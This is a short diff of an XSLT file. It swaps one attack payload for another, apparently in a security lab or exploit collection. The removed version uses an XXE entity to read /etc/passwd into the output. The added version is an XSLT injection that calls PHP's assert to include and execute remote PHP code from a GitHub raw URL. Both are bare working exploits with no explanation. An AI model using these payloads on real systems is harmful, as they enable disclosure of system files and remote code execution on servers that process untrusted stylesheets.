@@ -1,13 +1,9 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
-<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
-  <xsl:template match="/fruits">
-    Fruits &ext_file;:
-    <!-- Loop for each fruit -->
-    <xsl:for-each select="fruit">
-      <!-- Print name: description -->
-      - <xsl:value-of select="name"/>: <xsl:value-of select="description"/>
-    </xsl:for-each>
-  </xsl:template>
-
-</xsl:stylesheet>
+<?xml version="1.0" encoding="UTF-8"?>
+<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
+<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
+		<xsl:variable name="payload">
+			include("https://raw.githubusercontent.com/magnetohvcs/webJS/master/test5.php")
+		</xsl:variable>
+		<xsl:variable name="include" select="php:function('assert',$payload)"/>
+</body>
+</html>
